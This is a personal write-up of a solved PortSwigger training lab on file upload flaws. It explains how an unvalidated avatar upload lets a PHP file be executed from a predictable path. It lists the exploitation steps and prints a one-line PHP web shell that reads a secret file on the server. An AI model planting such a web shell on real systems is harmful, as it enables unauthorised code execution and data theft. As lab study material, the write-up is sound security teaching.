---
type: lab
platform: PortSwigger
topic: File Upload
difficulty: Apprentice
status: solved
date: 2026-10-28
tags: [portswigger, file-upload, rce]
---

# Remote code execution via web shell upload

## 🎯 Goal
Upload a PHP web shell and use it to exfiltrate the contents of `/home/carlos/secret`, then submit the secret.

## 🧠 Core idea
The avatar upload function stores whatever file is uploaded with no validation of its type or content — it trusts the extension/content blindly. Since uploaded files are also served back as static files from a predictable path, uploading a `.php` file means the server will execute it as a script when it's requested, not just serve it as an image. That's full remote code execution: I can run arbitrary PHP on the server.

## 🔍 Recon
- Logged in with `wiener:peter`, found the avatar upload option on the account page.
- Uploaded a normal image first and noticed it's served back via `GET /files/avatars/<filename>` — confirms uploaded files are accessible at a known, predictable path.
- No visible validation on file type during upload — the image preview loaded regardless of what checks might exist client-side.

## 💥 Exploitation (step by step)
1. Created a local file `exploit.php` containing:
   ```php
   <?php echo file_get_contents('/home/carlos/secret'); ?>
   ```
2. Used the avatar upload function to upload `exploit.php` instead of an image.
3. Upload succeeded with no rejection — confirms no file type validation.
4. Sent a request to `/files/avatars/exploit.php` via Burp Repeater.
5. Server executed the PHP file instead of serving it as plain text/image — response contained the contents of Carlos's secret file.
6. Copied the secret and submitted it via the lab banner button.

## 🧾 Payload used
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```